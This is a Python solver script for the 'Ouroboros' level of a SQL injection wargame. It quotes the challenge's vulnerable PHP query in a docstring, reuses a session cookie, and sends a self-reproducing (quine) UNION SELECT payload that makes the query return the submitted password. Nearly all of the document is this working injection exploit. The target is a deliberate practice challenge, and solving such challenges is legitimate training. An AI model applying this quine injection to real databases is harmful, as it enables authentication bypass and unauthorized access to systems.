#!/usr/bin/env python3
import pickle
import los
from getpass import getpass


def main():
    '''
    Ouroboros

    if(preg_match('/prob|_|\.|rollup|join|@/i', $_GET['pw'])) exit("No Hack ~_~");
    $query = "select pw from prob_ouroboros where pw='{$_GET[pw]}'";
    echo "<hr>query : <strong>{$query}</strong><hr><br>";
    $result = @mysqli_fetch_array(mysqli_query($db,$query));
    if($result['pw']) echo "<h2>Pw : {$result[pw]}</h2>";
    if(($result['pw']) && ($result['pw'] === $_GET['pw'])) solve("ouroboros");
    '''

    url = "https://los.rubiya.kr/chall/ouroboros_e3f483f087c922c84373b49950c212a9.php"

    try:
        with open('cooks.pickle', 'rb') as f:
            cook = pickle.load(f)
    except:
        cook = {'PHPSESSID': getpass(
            prompt='enter PHPSESSID cookie: ')}

    if "location.href='../';" in los.get_request(url, {}, cook, print_param=False):
        print('you need to login in browser')
        exit(1)

    param = {'pw': "' union select replace(replace('" +
             "\" union select replace(replace(" +
             "\"$\",char(34),char(39)),char(36),\"$\")" +
             " as quine#',char(34),char(39)),char(36),'\" union select replace" +
             "(replace(\"$\",char(34),char(39)),char(36),\"$\")" +
             " as quine#') as quine#"
             }

    response = los.get_request(url, param, cook)

    if 'Clear!' in response:
        print('Ouroboros Clear!')

    # Save cookie
    los.save_cookies(cook)


if __name__ == '__main__':
    main()

